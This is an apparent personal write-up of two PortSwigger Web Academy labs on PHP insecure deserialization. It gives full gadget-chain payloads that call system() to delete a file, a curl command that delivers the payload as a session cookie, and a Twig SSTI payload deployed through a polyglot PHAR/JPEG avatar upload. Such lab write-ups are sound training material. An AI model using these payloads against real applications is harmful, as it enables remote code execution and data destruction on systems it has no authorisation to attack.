---
title: PortSwigger Web Academy
description: Write-up of PortSwigger Web Academy challenges.
ignore_macros: true
---

# PortSwigger Web Academy

## Insecure deserialization

### Custom gadget chain for PHP deserialization

> Lab: [Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)

**1.** Source code leaks via backup file :

- /cgi-bin/libs/CustomTemplate.php~

```php
class CustomTemplate {
    // ...

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class DefaultMap {
    // ...

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
```

**2.** Create serialization payload

```php
<?php

class CustomTemplate {}
class Product {}
class Description {}
class DefaultMap {}

$defaultMap = new DefaultMap();
$defaultMap->callback = "system";

$customTemplate = new CustomTemplate();
$customTemplate->desc = $defaultMap;
$customTemplate->default_desc_type = "rm /home/carlos/morale.txt";

echo serialize($customTemplate);
```

**3.** Execute it via cookie

```bash
$ php xpl.php
O:14:"CustomTemplate":2:{s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";}s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";}%
$ php xpl.php | base64 -w0 | sed 's/=/%3D/g'
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6NDoiZGVzYyI7TzoxMDoiRGVmYXVsdE1hcCI6MTp7czo4OiJjYWxsYmFjayI7czo2OiJzeXN0ZW0iO31zOjE3OiJkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30%3D
$ curl 'https://0ae800d704396245c019105e00b3005d.web-security-academy.net/' -b "session=$(php xpl.php | base64 -w0 | sed 's/=/%3D/g')"
```

### PHAR deserialization & custom gadget chain

> Lab : [Using PHAR deserialization to deploy a custom gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)

**1.** Source code leaks via directory listing and backup file :

- /cgi-bin/CustomTemplate.php~
- /cgi-bin/Blog.php~

```php
class Blog {
    // ...

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }
}

class CustomTemplate {
    // ...

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}
```

- *Blog* `__wakeup()` - setup SSTI payload
- *CustomTemplate* `__destruct()` -> `lockFilePath()` -> *Blog* `__toString()` - run SSTI payload

**2.** Create an unserialize payload to trigger the Twig SSTI

```php
$blog = new Blog('toto',
    '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("<SEHLL_COMMAND>")}}');
$object = new CustomTemplate($blog);
```

**3.** Create a polyglot phar/jpeg file thanks to [xanhacks/phar-jpg-polyglot](https://gitlab.com/xanhacks/phar-jpg-polyglot/).

**4.** Upload malicious phar as avatar picture.

**5.** Load/execute it by visiting `/cgi-bin/avatar.php?avatar=phar://wiener`